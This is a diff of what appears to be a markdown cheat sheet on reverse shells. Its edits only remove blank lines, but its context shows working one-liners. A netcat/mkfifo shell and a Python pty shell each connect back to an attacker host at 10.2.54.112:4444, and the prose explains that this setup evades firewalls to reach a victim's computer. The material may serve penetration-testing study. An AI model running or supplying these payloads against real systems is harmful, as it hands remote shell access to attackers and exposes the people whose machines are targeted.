@@ -1,7 +1,5 @@
 A reverse shell, also known as a remote shell or “connect-back shell,” takes advantage of the target system’s vulnerabilities to initiate a shell session and then access the victim’s computer. The goal is to offer the attacker machine a shell instead of my machine requesting it from the target which would be much easier to evade firewalls.
-
 # Useful Commands:
-
 ## On the Attacker machine
 
 To start a netcat listener we use  the following command
@@ -47,7 +45,6 @@ mkfifo /tmp/ttlrs; nc 10.2.54.112 4444 0</tmp/ttlrs | /bin/sh >/tmp/ttlrs 2>&1; 
 ```bash
 export RHOST="10.2.54.112";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
 ```
-
 # Extra:
 
 **Important Note :** 
